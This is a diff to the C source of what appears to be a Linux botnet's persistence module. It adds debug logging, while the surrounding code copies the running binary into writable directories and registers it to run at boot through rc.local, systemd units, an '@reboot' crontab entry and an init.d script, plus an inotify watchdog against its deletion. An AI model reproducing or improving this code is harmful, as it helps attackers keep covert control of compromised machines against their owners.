@@ -39,6 +39,9 @@ static void generate_random_name(char *buf, int len) {
 static BOOL is_readonly(const char *path) {
     struct statvfs fs;
     if (statvfs(path, &fs) != 0) {
+        #ifdef DEBUG
+            printf("[persistence] statvfs failed for %s: %s (errno: %d)\n", path, strerror(errno), errno);
+        #endif
         return TRUE; 
     }
     return (fs.f_flag & ST_RDONLY) != 0;
@@ -48,8 +51,9 @@ static BOOL is_readonly(const char *path) {
 static BOOL is_tmpfs(const char *path) {
     FILE *mtab = fopen("/proc/mounts", "r");
     if (mtab == NULL) {
-        
-        
+        #ifdef DEBUG
+            printf("[persistence] cannot open /proc/mounts: %s (errno: %d)\n", strerror(errno), errno);
+        #endif
         return FALSE;
     }
     
@@ -91,6 +95,9 @@ static BOOL is_tmpfs(const char *path) {
 static long long get_available_space(const char *path) {
     struct statvfs fs;
     if (statvfs(path, &fs) != 0) {
+        #ifdef DEBUG
+            printf("[persistence] statvfs failed for %s: %s (errno: %d)\n", path, strerror(errno), errno);
+        #endif
         return 0;
     }
     return (long long)fs.f_bavail * (long long)fs.f_frsize;
@@ -100,6 +107,9 @@ static long long get_available_space(const char *path) {
 static long long get_file_size(const char *path) {
     struct stat st;
     if (stat(path, &st) != 0) {
+        #ifdef DEBUG
+            printf("[persistence] stat failed for %s: %s (errno: %d)\n", path, strerror(errno), errno);
+        #endif
         return 0;
     }
     return st.st_size;
@@ -115,6 +125,9 @@ static BOOL copy_file(const char *src, const char *dst) {
     
     src_size = get_file_size(src);
     if (src_size == 0) {
+        #ifdef DEBUG
+            printf("[persistence] copy_file: source file %s is empty or inaccessible\n", src);
+        #endif
         return FALSE;
     }
     
@@ -123,22 +136,34 @@ static BOOL copy_file(const char *src, const char *dst) {
     available_space = get_available_space(dst);
     long long min_free_space = 1024 * 1024; 
     if (available_space < src_size * 2 || available_space < min_free_space) {
+        #ifdef DEBUG
+            printf("[persistence] copy_file: insufficient space at %s (need %lld, have %lld)\n", dst, src_size * 2, available_space);
+        #endif
         return FALSE; 
     }
     
     src_fd = fopen(src, "rb");
     if (src_fd == NULL) {
+        #ifdef DEBUG
+            printf("[persistence] copy_file: cannot open source %s: %s (errno: %d)\n", src, strerror(errno), errno);
+        #endif
         return FALSE;
     }
     
     dst_fd = fopen(dst, "wb");
     if (dst_fd == NULL) {
+        #ifdef DEBUG
+            printf("[persistence] copy_file: cannot open destination %s: %s (errno: %d)\n", dst, strerror(errno), errno);
+        #endif
         fclose(src_fd);
         return FALSE;
     }
     
     while ((bytes_read = fread(buffer, 1, sizeof(buffer), src_fd)) > 0) {
         if (fwrite(buffer, 1, bytes_read, dst_fd) != bytes_read) {
+            #ifdef DEBUG
+                printf("[persistence] copy_file: write failed for %s: %s (errno: %d)\n", dst, strerror(errno), errno);
+            #endif
             fclose(src_fd);
             fclose(dst_fd);
             unlink(dst);
@@ -151,12 +176,19 @@ static BOOL copy_file(const char *src, const char *dst) {
     
     
     if (get_file_size(dst) != src_size) {
+        #ifdef DEBUG
+            printf("[persistence] copy_file: destination size mismatch for %s\n", dst);
+        #endif
         unlink(dst);
         return FALSE;
     }
     
     
-    chmod(dst, 0755);
+    if (chmod(dst, 0755) == -1) {
+        #ifdef DEBUG
+            printf("[persistence] copy_file: chmod failed for %s: %s (errno: %d)\n", dst, strerror(errno), errno);
+        #endif
+    }
     
     return TRUE;
 }
@@ -170,6 +202,9 @@ static BOOL setup_rclocal(const char *bot_path) {
     
     
     if (is_readonly("/etc")) {
+        #ifdef DEBUG
+            printf("[persistence] setup_rclocal: /etc is read-only\n");
+        #endif
         return FALSE;
     }
     
@@ -192,6 +227,9 @@ static BOOL setup_rclocal(const char *bot_path) {
     
     f = fopen(rclocal_path, "a");
     if (f == NULL) {
+        #ifdef DEBUG
+            printf("[persistence] setup_rclocal: cannot open %s: %s (errno: %d)\n", rclocal_path, strerror(errno), errno);
+        #endif
         return FALSE;
     }
     
@@ -211,16 +249,25 @@ static BOOL setup_systemd(const char *bot_path) {
     
     
     if (is_readonly("/etc")) {
+        #ifdef DEBUG
+            printf("[persistence] setup_systemd: /etc is read-only\n");
+        #endif
         return FALSE;
     }
     
     
     if (access("/etc/systemd/system", F_OK) != 0) {
+        #ifdef DEBUG
+            printf("[persistence] setup_systemd: /etc/systemd/system does not exist\n");
+        #endif
         return FALSE;
     }
     
     
     if (access("/etc/systemd/system", W_OK) != 0) {
+        #ifdef DEBUG
+            printf("[persistence] setup_systemd: /etc/systemd/system is not writable: %s (errno: %d)\n", strerror(errno), errno);
+        #endif
         return FALSE;
     }
     
@@ -229,6 +276,9 @@ static BOOL setup_systemd(const char *bot_path) {
     
     f = fopen(service_path, "w");
     if (f == NULL) {
+        #ifdef DEBUG
+            printf("[persistence] setup_systemd: cannot create %s: %s (errno: %d)\n", service_path, strerror(errno), errno);
+        #endif
         return FALSE;
     }
     
@@ -279,6 +329,9 @@ static BOOL setup_cron(const char *bot_path) {
     
     snprintf(cron_cmd, sizeof(cron_cmd), "(crontab -l 2>/dev/null; echo '@reboot %s &') | crontab -", bot_path);
     if (system(cron_cmd) != 0) {
+        #ifdef DEBUG
+            printf("[persistence] setup_cron: crontab command failed\n");
+        #endif
         return FALSE;
     }
     
@@ -356,6 +409,9 @@ void persistence_init(void) {
     
     len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
     if (len == -1) {
+        #ifdef DEBUG
+            printf("[persistence] persistence_init: cannot read /proc/self/exe: %s (errno: %d)\n", strerror(errno), errno);
+        #endif
         return;
     }
     self_exe[len] = '\0';
@@ -443,12 +499,17 @@ void persistence_init(void) {
                         break;
                     }
                 }
+            } else {
+                #ifdef DEBUG
+                    printf("[persistence] persistence_init: %s is not writable: %s (errno: %d)\n", fallback_dirs[i], strerror(errno), errno);
+                #endif
             }
         }
         
         if (!installed) {
-            
-            
+            #ifdef DEBUG
+                printf("[persistence] persistence_init: failed to install to any location\n");
+            #endif
             return;
         }
     }
@@ -482,8 +543,24 @@ void persistence_init(void) {
             fprintf(f, "### END INIT INFO\n\n");
             fprintf(f, "%s &\n", install_path);
             fclose(f);
-            chmod(init_script, 0755);
+            if (chmod(init_script, 0755) == -1) {
+                #ifdef DEBUG
+                    printf("[persistence] cannot chmod %s: %s (errno: %d)\n", init_script, strerror(errno), errno);
+                #endif
+            }
+        } else {
+            #ifdef DEBUG
+                printf("[persistence] cannot create %s: %s (errno: %d)\n", init_script, strerror(errno), errno);
+            #endif
         }
+    } else {
+        #ifdef DEBUG
+            if (access("/etc/init.d", F_OK) != 0) {
+                printf("[persistence] /etc/init.d does not exist\n");
+            } else if (access("/etc/init.d", W_OK) != 0) {
+                printf("[persistence] /etc/init.d is not writable: %s (errno: %d)\n", strerror(errno), errno);
+            }
+        #endif
     }
 }
 
@@ -493,19 +570,31 @@ static int inotify_wd = -1;
 
 void persistence_watchdog_init(void) {
     const char *persistent = get_persistent_path();
-    if (persistent == NULL)
+    if (persistent == NULL) {
+        #ifdef DEBUG
+            printf("[persistence] persistence_watchdog_init: no persistent path available\n");
+        #endif
         return;
+    }
     
     
     
     inotify_fd = inotify_init();
-    if (inotify_fd == -1)
+    if (inotify_fd == -1) {
+        #ifdef DEBUG
+            printf("[persistence] inotify_init failed: %s (errno: %d)\n", strerror(errno), errno);
+        #endif
         return;
+    }
     
     
     int flags = fcntl(inotify_fd, F_GETFL);
     if (flags != -1) {
         fcntl(inotify_fd, F_SETFL, flags | O_NONBLOCK);
+    } else {
+        #ifdef DEBUG
+            printf("[persistence] fcntl F_GETFL failed: %s (errno: %d)\n", strerror(errno), errno);
+        #endif
     }
     
     
@@ -523,6 +612,9 @@ void persistence_watchdog_init(void) {
     
     inotify_wd = inotify_add_watch(inotify_fd, dir_path, IN_DELETE | IN_MOVED_FROM);
     if (inotify_wd == -1) {
+        #ifdef DEBUG
+            printf("[persistence] inotify_add_watch failed for %s: %s (errno: %d)\n", dir_path, strerror(errno), errno);
+        #endif
         close(inotify_fd);
         inotify_fd = -1;
     }
